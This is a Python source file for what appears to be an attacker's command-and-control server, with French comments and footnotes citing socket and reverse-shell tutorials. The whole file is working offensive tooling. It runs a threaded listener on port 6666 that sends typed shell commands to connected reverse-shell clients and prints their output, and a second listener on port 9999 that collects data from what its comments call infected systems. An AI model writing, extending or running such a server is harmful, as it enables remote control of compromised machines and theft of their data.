#!/usr/bin/env python
#coding=utf-8
__author__ = "Karl Boulais"

import socket
import threading
import os
import platform
import json

class Server():
    def __init__(self):
        self._host = "0.0.0.0"
        self.cSocketList = []
        self.cAddrList = []
        self._serverThreadList = [self._serverData, self._serverReverseShell]


    def returnServerList(self):
        pass

    @staticmethod
    def _clrscr():
            if platform.system() == "Linux":
                os.system("clear")
            elif platform.system() == "Windows":
                os.system("cls")

    def _sending(self, c, data):
        return c.send(bytes(json.dumps(data), "UTF-8"))
         
    
    def _receiving(self, c):
        data = ""
        while True:
            try:
                data += c.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue

    def _systemData(self, c):
        data = {}
        quitting = False
        while not quitting:

            data = self._receiving(c)
            if data["message"] == "exit":
                c.close()
                quitting = True
            else:
                print(data["message"])
                
            # TODO: Change print for DAO 

    def _ReverseShell(self, c):

        quitting = False

        # Reçoit le premier message et initialise data["cwd"]
        data = self._receiving(c)
        while not quitting:

            data["command"] = input(f"{data['cwd']} $> ")
            if not data["command"].strip():
                continue
            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
                self._clrscr()
                continue
            else:
                # c.send(self.encode(data))
                self._sending(c, data)
                data = self._receiving(c)
            
            if data["command"].lower() == "exit":
                quitting = True
                c.close()
                continue
        
            print(data["output"])

    def _serverReverseShell(self, s):
        # Démarre le service pour recevoir les connexions ReverseShell
        c = None
        addr = None

        # On crée un objet socket
        # s = socket.socket()

        port = 6666

        s.bind((self._host, port))
        s.listen(5)

        while True:
            try:
                c, addr = s.accept()
                self.cSocketList.append(c)
                self.cAddrList.append(addr)
                print('Got connection from', addr)

                # On crée un thread receiving data
                connection_handler = threading.Thread(
                    target=self._ReverseShell,
                    args=(c,)
                )
                connection_handler.start()
                print("\n Nombre de Thread", threading.active_count())
            except socket.timeout:
                continue
    

    def _serverData(self, s):
        # Démarre le service pour recevoir les données des systèmes infectés

        c = None
        addr = None

        # On crée un objet socket
        # s = socket.socket()

        port = 9999
        s.bind((self._host, port))
        s.listen(5)

        while True:
            c, addr = s.accept()
            print('Got connection from', addr)

            # On crée un thread receiving data
            connection_handler = threading.Thread(
                target=self._systemData,
                args=(c,)
            )
            connection_handler.start()
            print("\n Nombre de Thread", threading.active_count())

    def main(self):
        # Démarre deux threads pour recevoir les connexions ReverseShell et d'envoi de données
        for server in self._serverThreadList:
            s = socket.socket()
            threading.Thread(target=server, args=(s,)).start()
            

    


if __name__ == "__main__":
   Server().main()















'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
.. [3]  https://www.thepythoncode.com/article/create-reverse-shell-python
        Création d'un reverse shell

'''